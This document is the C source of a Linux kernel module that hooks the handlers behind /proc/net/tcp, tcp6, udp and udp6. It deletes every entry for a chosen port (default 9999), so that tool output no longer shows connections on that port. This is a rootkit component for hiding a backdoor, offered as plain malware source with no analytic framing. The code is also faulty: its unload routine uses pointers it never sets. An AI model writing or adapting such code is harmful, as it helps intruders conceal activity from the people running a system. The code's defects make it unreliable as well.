#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <net/tcp.h>
#include <net/udp.h>

/*from net/ipv4/tcp_ipv4.c*/
#define TMPSZ 150

//#define PORT_TO_HIDE 9999


static int port = 9999;
module_param(port, int, S_IRUGO);

MODULE_LICENSE("GPL");

struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;					/* use count */
		atomic_t in_use;				/* number of callers into module in progress; */
										/* negative -> it's going away RSN */
		struct completion *pde_unload_completion;
		struct list_head pde_openers;	/* who did ->open, but not ->release */
		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
		u8 namelen;
		char name[];
};

int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
int (*old_tcp6_seq_show)(struct seq_file*, void *) = NULL;
int (*old_udp4_seq_show)(struct seq_file*, void *) = NULL;
int (*old_udp6_seq_show)(struct seq_file*, void *) = NULL;


char *strnstr(const char *haystack, const char *needle, size_t n)
{
	printk(KERN_INFO "HIDE PORT HAYSTACK: %s", haystack);
	printk(KERN_INFO "HIDE PORT PORT: %s", needle);
	
	char *s = strstr(haystack, needle);
	printk(KERN_INFO "HIDE PORT RESULT: %s", s);
		
	if (s == NULL)
		return NULL;
        if (s-haystack+strlen(needle) <= n){
		printk(KERN_INFO "HIDE PORT FOUND");
                return s;
	}
        else
                return NULL;
}

int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
{
        int retval=old_tcp4_seq_show(seq, v);

        char hex_port[12];

        sprintf(hex_port, "%x",port);

        if(strnstr(seq->buf+seq->count-TMPSZ,hex_port,TMPSZ))
	        seq->count -= TMPSZ;
	return retval;   
}

static int __init myinit(void)
{
        //struct tcp_seq_afinfo *my_afinfo = NULL;
        //struct rb_root *my_dir_entry = init_net.proc_net->subdir;
	/*while (strcmp(my_dir_entry->name, "tcp"))
                my_dir_entry = my_dir_entry->next;

        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)){
                old_tcp4_seq_show = my_afinfo->seq_ops.show;
                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
	}*/
	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct tcp_seq_afinfo *tcp6_seq;
	struct udp_seq_afinfo *udp_seq;
	struct udp_seq_afinfo *udp6_seq;
	
	
	/* Get the proc dir entry for /proc/<pid>/net */
	proc_rb_root = init_net.proc_net->subdir;

	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
		printk(KERN_INFO "HIDE PORT: DIR %s", proc_dir_entryptr->name);
		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
			tcp_seq = proc_dir_entryptr->data;
			old_tcp4_seq_show = tcp_seq->seq_ops.show;

			/* Hook the kernel function tcp4_seq_show */
			tcp_seq->seq_ops.show = hacked_tcp4_seq_show;
		}
		else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
			tcp6_seq = proc_dir_entryptr->data;
			old_tcp6_seq_show = tcp6_seq->seq_ops.show;

			printk(KERN_INFO "HIDE PORT: FOUND TCP6");
			/* Hook the kernel function tcp4_seq_show */
			tcp6_seq->seq_ops.show = hacked_tcp4_seq_show;
		}
		else if (!strcmp(proc_dir_entryptr->name, "udp")) {
			udp_seq = proc_dir_entryptr->data;
			old_udp4_seq_show = udp_seq->seq_ops.show;

			/* Hook the kernel function tcp4_seq_show */
			udp_seq->seq_ops.show = hacked_tcp4_seq_show;
		}
		else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
			udp6_seq = proc_dir_entryptr->data;
			old_udp6_seq_show = udp6_seq->seq_ops.show;

			printk(KERN_INFO "HIDE PORT: FOUND UDP6");
			/* Hook the kernel function tcp4_seq_show */
			udp6_seq->seq_ops.show = hacked_tcp4_seq_show;
		}	
		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}
				                        
        return 0;
}
        
static void myexit(void)
{
        /*struct tcp_seq_afinfo *my_afinfo = NULL;
        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
			 
        while (strcmp(my_dir_entry->name, "tcp"))
                my_dir_entry = my_dir_entry->next;
				        
        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)) {
	        my_afinfo->seq_ops.show=old_tcp4_seq_show;
        }*/
	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct tcp_seq_afinfo *tcp6_seq;
	struct udp_seq_afinfo *udp_seq;
	struct udp_seq_afinfo *udp6_seq;

	/* Get the proc dir entry for /proc/<pid>/net */
	proc_rb_root = init_net.proc_net->subdir;

	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);
		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
			tcp_seq->seq_ops.show = old_tcp4_seq_show;
		}
		else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
			tcp6_seq->seq_ops.show = old_tcp6_seq_show;
		}
		else if (!strcmp(proc_dir_entryptr->name, "udp")) {
			udp_seq->seq_ops.show = old_udp4_seq_show;
		}
		else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
			udp6_seq->seq_ops.show = old_udp6_seq_show;
		}	
		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}						                
}
                      
module_init(myinit);
module_exit(myexit);
